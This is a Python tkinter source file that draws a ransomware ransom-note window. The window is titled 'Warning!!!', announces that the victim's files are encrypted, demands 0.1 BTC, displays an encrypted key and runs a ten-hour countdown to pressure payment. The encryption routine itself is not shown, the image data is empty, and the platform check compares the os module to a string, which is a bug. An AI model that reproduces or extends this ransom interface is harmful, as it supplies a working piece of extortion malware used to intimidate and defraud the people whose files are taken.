from tkinter import *
from tkinter.ttk import *
import os
import threading
import time

class mainwindow(Tk):
    def __init__(self, encrypted_key_b64):
        Tk.__init__(self)
        self.title(string="Warning!!!")  # Set window title
        self.resizable(0, 0)  # Do not allow to be resized
        self.configure(background='black')
        # self.overrideredirect(True)
        self.style = Style()
        self.style.theme_use("clam")
        self.encrypted_key_b64 = encrypted_key_b64
        photo_code = ''''''
        pengu_code = ''''''        
        
        photo = PhotoImage(data=photo_code)
        photo = photo.subsample(4)
        
        pengu = PhotoImage(data=pengu_code)
        pengu = pengu.subsample(4)
        
        label = Label(self, image=photo, background='black')
        label.image = photo  # keep a reference!
        label.grid(row=5, column=0, rowspan=2)
        
        label = Label(self, image=photo, background='black')
        label.image = photo  # keep a reference!
        label.grid(row=5, column=3, rowspan=2)
        
        # label = Label(self, image=pengu, background='white')
        # label.image = pengu  # keep a reference!
        # label.grid(row=8, column=0, rowspan=2)
        
        message = f'''YOUR FILES HAVE BEEN ENCRYPTED

All your personal or coporate document, videos, musics, images and any other files have been encrypted with a military grade encryption key. The key has been stored on our server. For you to get this key is here!?!?! You must pay me 0.1 BTC or BUY ME SOME BEER PLZ.

===== begin_key =====
%s
===== end_key =====

KEEP IT    
'''%(self.encrypted_key_b64)
        
        Label(self, image=pengu, wraplength=880, background='white').grid(row=8, column=0, columnspan=4)
        label.image = pengu
        Label(self, text=message, wraplength=880, font='Helvetica 14 bold', foreground='white',
              background='red').grid(row=0, column=0, columnspan=4)

        Label(self, text='', font='Helvetica 18 bold', foreground='red',
              background='black').grid(row=5, column=2)
        Label(self, text='', font='Helvetica 18 bold', foreground='red',
              background='black').grid(row=6, column=2)

        def start_thread():
            # Start timer as thread
            thread = threading.Thread(target=start_timer)
            thread.daemon = True
            thread.start()

        def start_timer():
            Label(self, text='TIME LEFT:', font='Helvetica 18 bold', foreground='red',
                  background='black').grid(row=5, column=0, columnspan=4)
            try:
                s = 36000  # 10 hours
                while s:
                    min, sec = divmod(s, 60)
                    time_left = '{:02d}:{:02d}'.format(min, sec)

                    Label(self, text=time_left, font='Helvetica 18 bold', foreground='red',
                          background='black').grid(row=6, column=0, columnspan=4)
                    time.sleep(1)
                    s -= 1
            except KeyboardInterrupt:
                print('Closed...')

        if os == 'Windows':
            pass
        else:
            start_thread()
